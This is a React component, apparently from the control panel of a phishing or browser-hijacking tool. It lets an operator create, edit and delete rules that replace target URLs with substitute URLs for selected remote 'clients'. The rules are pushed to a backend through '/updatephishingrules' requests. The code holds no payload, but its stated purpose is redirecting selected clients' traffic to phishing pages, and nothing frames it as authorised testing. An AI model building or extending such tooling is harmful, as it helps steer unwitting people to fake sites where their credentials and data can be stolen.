import React, { useState, useEffect } from "react";
import { Globe, Pen } from "lucide-react";
import { GlobalContext } from "../App";

const PhishingRules = ({ selectedClients, selectedClientId, className = "" }) => {
  const { endpointUrl } = React.useContext(GlobalContext);
  const [rules, setRules] = useState([]);
  const [newTargetUrl, setNewTargetUrl] = useState("");
  const [newReplacementUrl, setNewReplacementUrl] = useState("");

  // Get client IDs based on selection mode
  const getClientIds = () => {
    if (selectedClients.size > 0) {
      return Array.from(selectedClients);
    } else if (selectedClientId) {
      return [selectedClientId];
    }
    return [];
  };

  // Fetch existing rules when selected clients change
  useEffect(() => {
    const fetchRules = async () => {
      const clientIds = getClientIds();
      if (clientIds.length === 0) {
        setRules([]);
        return;
      }
      
      try {
        const response = await fetch(`${endpointUrl}/phishingrules`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ client_ids: clientIds })
        });
        
        const data = await response.json();
        if (data.success) {
          // Group rules by target_url and replacement_url to show unique rules
          const uniqueRules = Array.from(new Set(
            data.rules.map(r => JSON.stringify({ target_url: r.target_url, replacement_url: r.replacement_url }))
          )).map(str => JSON.parse(str));
          setRules(uniqueRules);
        }
      } catch (error) {
        console.error("Error fetching phishing rules:", error);
      }
    };
    
    fetchRules();
  }, [selectedClients, selectedClientId, endpointUrl]);

  const handleAddRule = async () => {
    if (!newTargetUrl || !newReplacementUrl) return;
    
    const newRules = [...rules, { target_url: newTargetUrl, replacement_url: newReplacementUrl }];
    const clientIds = getClientIds();
    if (clientIds.length === 0) return;
    
    try {
      // Update rules for each selected client
      await Promise.all(clientIds.map(async (clientId) => {
        await fetch(`${endpointUrl}/updatephishingrules`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            rules: newRules,
            client_id: clientId
          })
        });
      }));
      
      setRules(newRules);
      setNewTargetUrl("");
      setNewReplacementUrl("");
    } catch (error) {
      console.error("Error updating phishing rules:", error);
    }
  };

  const handleDeleteRule = async (index) => {
    const newRules = rules.filter((_, i) => i !== index);
    const clientIds = getClientIds();
    if (clientIds.length === 0) return;
    
    try {
      // Update rules for each selected client
      await Promise.all(clientIds.map(async (clientId) => {
        await fetch(`${endpointUrl}/updatephishingrules`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            rules: newRules,
            client_id: clientId
          })
        });
      }));
      
      setRules(newRules);
    } catch (error) {
      console.error("Error updating phishing rules:", error);
    }
  };

  const handleEditRule = (rule) => {
    setNewTargetUrl(rule.target_url);
    setNewReplacementUrl(rule.replacement_url);
    handleDeleteRule(rules.findIndex(r => 
      r.target_url === rule.target_url && 
      r.replacement_url === rule.replacement_url
    ));
  };

  return (
      <div className={`flex flex-col p-4 rounded-lg bg-gray-100 ${className}`}>
        <div className="flex items-center mb-4">
          <div className="bg-white rounded-full p-3 shadow-sm">
            <Globe className="h-8 w-8 text-blue-600" />
          </div>
          <div className="ml-4">
            <h3 className="text-lg font-semibold text-gray-900">Phishing Rules</h3>
            <p className="text-sm text-gray-500">Manage URL replacements for selected clients</p>
          </div>
        </div>

        {/* Rules list */}
        <div className="mb-4 space-y-2 h-48 overflow-y-auto pr-2">
          {rules.map((rule, index) => (
            <div key={index} className="flex items-center gap-2 bg-white p-2 rounded-md">
              <div className="flex-grow">
                <div className="text-sm font-medium">{rule.target_url}</div>
                <div className="text-sm text-gray-500">→ {rule.replacement_url}</div>
              </div>
              <button
                onClick={() => handleEditRule(rule)}
                className="text-blue-500 hover:text-blue-600 p-1"
                title="Edit rule"
              >
                <Pen className="h-4 w-4" />
              </button>
              <button
                onClick={() => handleDeleteRule(index)}
                className="text-red-500 hover:text-red-600 p-1"
                title="Delete rule"
              >
                ×
              </button>
            </div>
          ))}
        </div>

        {/* Add new rule */}
        <div className="flex flex-col gap-2">
          <input
            type="text"
            placeholder="Target URL pattern (e.g., https://example.com/*)"
            className="w-full px-3 py-2 border-2 border-blue-500 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
            value={newTargetUrl}
            onChange={(e) => setNewTargetUrl(e.target.value)}
          />
          <input
            type="text"
            placeholder="Replacement URL"
            className="w-full px-3 py-2 border-2 border-blue-500 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
            value={newReplacementUrl}
            onChange={(e) => setNewReplacementUrl(e.target.value)}
          />
          <button
            className="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-md text-sm font-medium transition-colors"
            onClick={handleAddRule}
          >
            Add Rule
          </button>
        </div>
      </div>
  );
};

export default PhishingRules;
